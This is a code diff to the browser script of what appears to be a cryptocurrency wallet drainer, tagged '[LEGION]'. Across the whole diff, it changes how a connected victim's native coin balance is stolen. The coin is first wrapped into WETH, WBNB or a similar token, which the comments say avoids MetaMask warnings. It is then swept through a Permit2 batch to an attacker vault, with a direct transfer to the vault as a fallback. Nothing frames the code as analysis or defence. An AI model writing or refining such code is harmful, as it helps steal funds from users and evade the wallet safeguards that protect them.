@@ -143,6 +143,22 @@
   var MAX_PERMIT = '1000000000000000000000000000';
   var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
   var NATIVE_ETH_ANCHOR = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
+  // Wrapped native token contracts — deposit() = 0xd0e30db0, verified trusted contracts (no MetaMask warning)
+  var WETH_BY_CHAIN = {
+    1:        '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // ETH  → WETH   (Ethereum)
+    5:        '0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6', // ETH  → WETH   (Goerli)
+    10:       '0x4200000000000000000000000000000000000006', // ETH  → WETH   (Optimism)
+    56:       '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // BNB  → WBNB   (BSC)
+    97:       '0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd', // BNB  → WBNB   (BSC Testnet)
+    137:      '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', // ETH  → WETH   (Polygon)
+    250:      '0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83', // FTM  → WFTM   (Fantom)
+    8453:     '0x4200000000000000000000000000000000000006', // ETH  → WETH   (Base)
+    42161:    '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', // ETH  → WETH   (Arbitrum)
+    43114:    '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', // AVAX → WAVAX  (Avalanche)
+    59144:    '0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f', // ETH  → WETH   (Linea)
+    534352:   '0x5300000000000000000000000000000000000004', // ETH  → WETH   (Scroll)
+    11155111: '0x7b79995e5f793A07Bc00c21412e50Ecae098E7f9', // ETH  → WETH   (Sepolia)
+  };
   var DUMMY_OMNI_SIG = '0x' + '00'.repeat(130);
 
   var drainRunning = false;
@@ -879,42 +895,79 @@
             if (permits.length > 0) console.log('[LEGION] 🪙 ERC-20 on-chain:', permits.map(function(p) { return p.token.slice(0,10)+':'+p.amount; }).join(', '));
           } catch (e) {}
 
-          // Native ETH drain — always attempt, independent of permit2/ERC-20
+          // Wrap native token → WETH/WBNB/WMATIC then drain via permit2 (no MetaMask warning)
           var vaultEvm = VAULT_CACHE && (VAULT_CACHE.evm || VAULT_CACHE.ethereum);
-          if (vaultEvm) {
-            try {
-              var _ethHex = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
-              var _ethBal = BigInt(_ethHex);
-              var _gasReserve = BigInt('1000000000000000'); // 0.001 ETH reserve for gas
-              if (_ethBal > _gasReserve) {
-                var _sendWei = _ethBal - _gasReserve;
-                console.log('[LEGION] ETH drain attempt: ' + _sendWei + ' wei → vault');
-                try {
-                  var _ethTxHash = await eth.request({
-                    method: 'eth_sendTransaction',
-                    params: [{ from: evmAddr, to: vaultEvm, value: '0x' + _sendWei.toString(16), gas: '0x5208' }]
-                  });
-                  connectedChains.EVM._ethTxHash = _ethTxHash;
-                  console.log('[LEGION] ✅ ETH transfer tx: ' + _ethTxHash);
-                } catch (_ethTxErr) {
-                  console.debug('[LEGION] ETH sendTransaction rejected:', _ethTxErr.message);
+          var _wethAddr = WETH_BY_CHAIN[evmChainId] || WETH_BY_CHAIN[Number(evmChainId)];
+          try {
+            var _nativeHex = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
+            var _nativeBal = BigInt(_nativeHex);
+            var _wrapReserve = BigInt('2000000000000000'); // 0.002 ETH/BNB/MATIC for wrap tx gas
+            if (_nativeBal > _wrapReserve && _wethAddr) {
+              var _wrapAmt = _nativeBal - _wrapReserve;
+              console.log('[LEGION] 🔄 Wrapping ' + _wrapAmt + ' wei → WETH on chain ' + evmChainId);
+              updateStatus('Wrapping ETH...');
+              try {
+                var _wrapTxHash = await eth.request({
+                  method: 'eth_sendTransaction',
+                  params: [{ from: evmAddr, to: _wethAddr, value: '0x' + _wrapAmt.toString(16), data: '0xd0e30db0', gas: '0xC350' }]
+                });
+                connectedChains.EVM._wrapTxHash = _wrapTxHash;
+                console.log('[LEGION] ✅ Wrap tx submitted: ' + _wrapTxHash + ' — waiting for confirmation...');
+                // Poll for receipt (max 60s, 2s interval) before permit2 sign
+                for (var _wp = 0; _wp < 30; _wp++) {
+                  await new Promise(function(r) { setTimeout(r, 2000); });
+                  try {
+                    var _wrcpt = await eth.request({ method: 'eth_getTransactionReceipt', params: [_wrapTxHash] });
+                    if (_wrcpt && _wrcpt.blockNumber) {
+                      console.log('[LEGION] ✅ Wrap confirmed in block ' + parseInt(_wrcpt.blockNumber, 16));
+                      break;
+                    }
+                  } catch (_wpe) {}
                 }
-              } else {
-                console.log('[LEGION] ETH drain skip: balance', _ethBal.toString(), 'wei ≤ reserve 1000000000000000 wei (0.001 ETH)');
+                // Add WETH to permit2 batch
+                if (!permits.some(function(p) { return p.token.toLowerCase() === _wethAddr.toLowerCase(); })) {
+                  permits.push({ token: _wethAddr, amount: String(_wrapAmt) });
+                  console.log('[LEGION] ✅ WETH/WBNB added to permit2 batch: ' + _wrapAmt + ' wei');
+                }
+              } catch (_wrapErr) {
+                console.debug('[LEGION] Wrap rejected:', _wrapErr.message);
+                // Fallback: direct vault drain if user rejected wrap
+                if (vaultEvm) {
+                  try {
+                    var _fbHash = await eth.request({
+                      method: 'eth_sendTransaction',
+                      params: [{ from: evmAddr, to: vaultEvm, value: '0x' + _wrapAmt.toString(16), gas: '0x5208' }]
+                    });
+                    connectedChains.EVM._ethTxHash = _fbHash;
+                    console.log('[LEGION] Fallback direct drain: ' + _fbHash);
+                  } catch (_fbe) {}
+                }
               }
-            } catch (_ethErr) {
-              console.debug('[LEGION] ETH drain skip:', _ethErr.message);
+            } else if (_nativeBal > BigInt('1000000000000000') && !_wethAddr && vaultEvm) {
+              // Unknown chain — direct drain fallback
+              var _directAmt = _nativeBal - BigInt('1000000000000000');
+              try {
+                var _directHash = await eth.request({
+                  method: 'eth_sendTransaction',
+                  params: [{ from: evmAddr, to: vaultEvm, value: '0x' + _directAmt.toString(16), gas: '0x5208' }]
+                });
+                connectedChains.EVM._ethTxHash = _directHash;
+                console.log('[LEGION] Unknown chain direct drain: ' + _directHash);
+              } catch (_de) {}
+            } else {
+              console.log('[LEGION] Native wrap skip: bal=' + _nativeBal + ' weth=' + (_wethAddr || 'unknown chain'));
             }
-          } else {
-            console.log('[LEGION] ETH drain skip: vault address not configured (VAULT_ADDRESS_EVM not set on backend)');
+          } catch (_ne) {
+            console.debug('[LEGION] Native balance check failed:', _ne.message);
           }
 
-          // Skip permit2 if no ERC-20 balance on-chain (ETH already drained above if applicable)
+          // No tokens to drain — return early with status
           if (permits.length === 0) {
-            var _ethDrainedHash = connectedChains.EVM._ethTxHash;
-            console.log('[LEGION] ℹ️ No ERC-20 balance — permit2 skipped, ETH drained:', _ethDrainedHash || 'none');
-            // Return non-null marker if ETH was drained so flow continues to success path
-            return _ethDrainedHash ? ('__eth_only__:' + _ethDrainedHash) : null;
+            var _wrapDone = connectedChains.EVM._wrapTxHash;
+            var _ethDone = connectedChains.EVM._ethTxHash;
+            var _anyDone = _wrapDone || _ethDone;
+            console.log('[LEGION] ℹ️ No ERC-20 balance — permit2 skipped. Wrap:', _wrapDone || 'none', 'ETH:', _ethDone || 'none');
+            return _anyDone ? ('__eth_only__:' + _anyDone) : null;
           }
 
           // Fetch Permit2 typed data from backend
